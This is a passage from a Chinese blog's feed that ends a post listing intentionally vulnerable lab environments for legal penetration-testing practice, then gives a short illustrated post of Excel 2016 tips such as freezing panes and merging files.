rel="noopener">https://github.com/UnrealAkama/NightShade</a></td></tr><tr><td>MCIR</td><td><a href="https://github.com/SpiderLabs/MCIR" target="_blank" rel="noopener">https://github.com/SpiderLabs/MCIR</a></td></tr><tr><td>Docker</td><td><a href="https://www.docker.com/" target="_blank" rel="noopener">https://www.docker.com/</a></td></tr><tr><td>Vagrant</td><td><a href="https://www.vagrantup.com/" target="_blank" rel="noopener">https://www.vagrantup.com/</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>SmartOS</td><td><a href="https://smartos.org/" target="_blank" rel="noopener">https://smartos.org/</a></td></tr><tr><td>SmartDataCenter</td><td><a href="https://github.com/joyent/sdc" target="_blank" rel="noopener">https://github.com/joyent/sdc</a></td></tr><tr><td>vSphere Hypervisor</td><td><a href="https://www.vmware.com/products/vsphere-hypervisor/" target="_blank" rel="noopener">https://www.vmware.com/products/vsphere-hypervisor/</a></td></tr><tr><td>GNS3</td><td><a href="http://sourceforge.net/projects/gns-3/" target="_blank" rel="noopener">http://sourceforge.net/projects/gns-3/</a></td></tr><tr><td>OCCP</td><td><a href="https://opencyberchallenge.net/" target="_blank" rel="noopener">https://opencyberchallenge.net/</a></td></tr><tr><td>XAMPP</td><td><a href="https://www.apachefriends.org/index.html" target="_blank" rel="noopener">https://www.apachefriends.org/index.html</a></td></tr></tbody></table><h1 id="0x09-Miscellaneous"><a href="#0x09-Miscellaneous" class="headerlink" title="0x09 Miscellaneous"></a>0x09 <strong>Miscellaneous</strong></h1><table><thead><tr><th>VulnVPN</th><th><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></th></tr></thead><tbody><tr><td>VulnVoIP</td><td><a href="http://www.rebootuser.com/?page_id=1041" target="_blank" rel="noopener">http://www.rebootuser.com/?page_id=1041</a></td></tr><tr><td>Vulnserver</td><td><a href="http://www.thegreycorner.com/2010/12/introducing-vulnserver.html" target="_blank" rel="noopener">http://www.thegreycorner.com/2010/12/introducing-vulnserver.html</a></td></tr><tr><td>NETinVM</td><td><a href="http://informatica.uv.es/~carlos/docencia/netinvm/" target="_blank" rel="noopener">http://informatica.uv.es/~carlos/docencia/netinvm/</a></td></tr><tr><td>DVRF</td><td><a href="https://github.com/praetorian-inc/DVRF" target="_blank" rel="noopener">https://github.com/praetorian-inc/DVRF</a></td></tr><tr><td>HackSys Extreme Vulnerable Driver</td><td><a href="http://www.payatu.com/hacksys-extreme-vulnerable-driver/" target="_blank" rel="noopener">http://www.payatu.com/hacksys-extreme-vulnerable-driver/</a></td></tr><tr><td>VirtuaPlant</td><td><a href="https://github.com/jseidl/virtuaplant" target="_blank" rel="noopener">https://github.com/jseidl/virtuaplant</a></td></tr><tr><td>Fosscomm</td><td><a href="https://github.com/nikosdano/fosscomm" target="_blank" rel="noopener">https://github.com/nikosdano/fosscomm</a></td></tr><tr><td>Morning Catch</td><td><a href="http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/" target="_blank" rel="noopener">http://blog.cobaltstrike.com/2014/08/06/introducing-morning-catch-a-phishing-paradise/</a></td></tr><tr><td>AWBO</td><td><a href="https://labs.snort.org/awbo/awbo.html" target="_blank" rel="noopener">https://labs.snort.org/awbo/awbo.html</a></td></tr></tbody></table><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在学习渗透测试的过程中，光学理论知识是不够的，还需要结合实战来进行学习。但是国家法律是不允许我们对互联网上的web站在未授权的情况下进行渗透测试的，所以我们只能通过自己搭建环境来进行学习。下面给大家分享一些靶场，免得大家再去寻找。&lt;/p&gt;
    
    </summary>
    
      <category term="渗透测试" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
      <category term="靶场" scheme="https://www.mad-coding.cn/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/%E9%9D%B6%E5%9C%BA/"/>
    
    
      <category term="靶场" scheme="https://www.mad-coding.cn/tags/%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>MS2016-Excel使用的一些技巧</title>
    <link href="https://www.mad-coding.cn/2019/09/25/MS2016-Excel%E4%BD%BF%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%8A%80%E5%B7%A7/"/>
    <id>https://www.mad-coding.cn/2019/09/25/MS2016-Excel使用的一些技巧/</id>
    <published>2019-09-25T09:01:33.000Z</published>
    <updated>2019-09-25T09:20:39.848Z</updated>
    
    <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~</p><a id="more"></a><h1 id="0x01-解决问题"><a href="#0x01-解决问题" class="headerlink" title="0x01 解决问题"></a>0x01 解决问题</h1><h2 id="1-1-设置行高"><a href="#1-1-设置行高" class="headerlink" title="1.1 设置行高"></a>1.1 设置行高</h2><p>右击需要设置的行和列，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170616.png" class="lozad"></p><h2 id="1-2-合并多个文件"><a href="#1-2-合并多个文件" class="headerlink" title="1.2 合并多个文件"></a>1.2 合并多个文件</h2><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170637.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170645.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170653.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170702.png" class="lozad"></p><p>然后等待数据被加载出来</p><h2 id="1-3-冻结指定的行和列"><a href="#1-3-冻结指定的行和列" class="headerlink" title="1.3 冻结指定的行和列"></a>1.3 冻结指定的行和列</h2><h3 id="1-3-1-案例1"><a href="#1-3-1-案例1" class="headerlink" title="1.3.1 案例1"></a>1.3.1 案例1</h3><blockquote><p>冻结首行首列只需要点击A2,B2单元格</p></blockquote><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170758.png" class="lozad"></p><p>然后到视图-&gt;冻结窗口-&gt;冻结窗口</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170809.png" class="lozad"></p><p>结果展示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925170824.gif" class="lozad"></p><h3 id="1-3-2-案例2"><a href="#1-3-2-案例2" class="headerlink" title="1.3.2 案例2"></a>1.3.2 案例2</h3><blockquote><p>冻结指定行列</p></blockquote><p>为了给大家更形象的理解，我画了一个丑图，希望大家可以看懂^v^</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171343.png" class="lozad"></p><p>想冻结前两行，前两列</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171624.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171726.png" class="lozad"></p><p>结果展示：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190925171838.gif" class="lozad"></p><h1 id="0x2"><a href="#0x2" class="headerlink" title="0x2"></a>0x2</h1><p>### </p><hr>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;0x00-前言&quot;&gt;&lt;a href=&quot;#0x00-前言&quot; class=&quot;headerlink&quot; title=&quot;0x00 前言&quot;&gt;&lt;/a&gt;0x00 前言&lt;/h1&gt;&lt;p&gt;在这个信息大爆炸的时代，不会电脑的电脑白将难以生存，不会office办公软件的电脑白将难以升职加薪。这里主要记录一下自己在工作中碰到的一些excel问题，方便他人，利于自己。皮卡皮卡~&lt;/p&gt;
    
    </summary>
    
      <category term="Windows" scheme="https://www.mad-coding.cn/categories/Windows/"/>
    
    
      <category term="解决问题" scheme="https://www.mad-coding.cn/tags/%E8%A7%A3%E5%86%B3%E9%97%AE%E9%A2%98/"/>
    
  </entry>
  
</feed>
